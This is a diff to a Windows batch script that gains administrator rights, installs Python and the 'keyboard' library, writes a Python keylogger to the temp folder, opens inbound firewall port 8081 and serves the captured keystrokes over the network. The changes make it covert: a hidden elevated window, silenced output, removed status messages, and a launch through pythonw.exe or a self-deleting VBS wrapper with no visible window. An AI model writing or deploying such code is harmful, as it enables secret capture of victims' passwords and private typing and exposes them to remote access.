@@ -1,31 +1,41 @@
 @echo off
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
     exit /b
 )
 
-echo Detecting Python installation...
-set PYTHON_EXE=
-if exist "C:\Program Files\Python311\python.exe" set PYTHON_EXE=C:\Program Files\Python311\python.exe
-if exist "C:\Program Files\Python312\python.exe" set PYTHON_EXE=C:\Program Files\Python312\python.exe
-if exist "C:\Python311\python.exe" set PYTHON_EXE=C:\Python311\python.exe
-if exist "C:\Python312\python.exe" set PYTHON_EXE=C:\Python312\python.exe
-for /f "delims=" %%i in ('where python 2^>nul') do set PYTHON_EXE=%%i
+REM All operations run silently
 
-if "%PYTHON_EXE%"=="" (
-    echo Python not found - installing...
-    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python-installer.exe' -UseBasicParsing; Start-Process -FilePath '%TEMP%\python-installer.exe' -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait; Remove-Item '%TEMP%\python-installer.exe'"
+set PYTHON_EXE=
+set PYTHONW_EXE=
+if exist "C:\Program Files\Python311\pythonw.exe" (
     set PYTHON_EXE=C:\Program Files\Python311\python.exe
-    timeout /t 5 /nobreak >nul
+    set PYTHONW_EXE=C:\Program Files\Python311\pythonw.exe
+)
+if exist "C:\Program Files\Python312\pythonw.exe" (
+    set PYTHON_EXE=C:\Program Files\Python312\python.exe
+    set PYTHONW_EXE=C:\Program Files\Python312\pythonw.exe
+)
+if exist "C:\Python311\pythonw.exe" (
+    set PYTHON_EXE=C:\Python311\python.exe
+    set PYTHONW_EXE=C:\Python311\pythonw.exe
+)
+if exist "C:\Python312\pythonw.exe" (
+    set PYTHON_EXE=C:\Python312\python.exe
+    set PYTHONW_EXE=C:\Python312\pythonw.exe
 )
 
-echo Using Python: %PYTHON_EXE%
+if "%PYTHON_EXE%"=="" (
+    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python-installer.exe' -UseBasicParsing; Start-Process -FilePath '%TEMP%\python-installer.exe' -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait; Remove-Item '%TEMP%\python-installer.exe'" >nul 2>&1
+    set PYTHON_EXE=C:\Program Files\Python311\python.exe
+    set PYTHONW_EXE=C:\Program Files\Python311\pythonw.exe
+    timeout /t 5 /nobreak >nul 2>&1
+)
 
-echo Installing Python dependencies...
-"%PYTHON_EXE%" -m pip install keyboard flask flask-socketio --quiet 2>nul
+"%PYTHON_EXE%" -m pip install keyboard flask flask-socketio --quiet >nul 2>&1
 
-echo Creating keylogger script...
+REM Create keylogger script
 (
 echo from flask import Flask, render_template_string
 echo from flask_socketio import SocketIO
@@ -127,20 +137,21 @@ echo def index^(^):
 echo     return render_template_string^(HTML_TEMPLATE^)
 echo.
 echo if __name__ == "__main__":
-echo     print^("\n=== KEYLOGGER STARTED ===\nAccess: http://localhost:8081\n=========================\n"^)
 echo     socketio.run^(app, host="0.0.0.0", port=8081, debug=False, allow_unsafe_werkzeug=True^)
 ) > "%TEMP%\kl.py"
 
-echo Adding firewall rule...
 netsh advfirewall firewall add rule name="Keylogger" dir=in action=allow protocol=TCP localport=8081 >nul 2>&1
 
-echo Starting keylogger...
-start "Keylogger" "%PYTHON_EXE%" "%TEMP%\kl.py"
+REM Start keylogger completely hidden using pythonw.exe or VBS wrapper
+if not "%PYTHONW_EXE%"=="" (
+    REM Use pythonw.exe - no console window
+    start "" "%PYTHONW_EXE%" "%TEMP%\kl.py"
+) else (
+    REM Create VBS wrapper to hide window
+    echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run.vbs"
+    echo objShell.Run "cmd /c ""%PYTHON_EXE%"" ""%TEMP%\kl.py""", 0, False >> "%TEMP%\run.vbs"
+    cscript //nologo "%TEMP%\run.vbs"
+    del "%TEMP%\run.vbs"
+)
 
-echo.
-echo ====================================
-echo Keylogger started successfully!
-echo Access: http://localhost:8081
-echo ====================================
-echo.
-pause
+exit
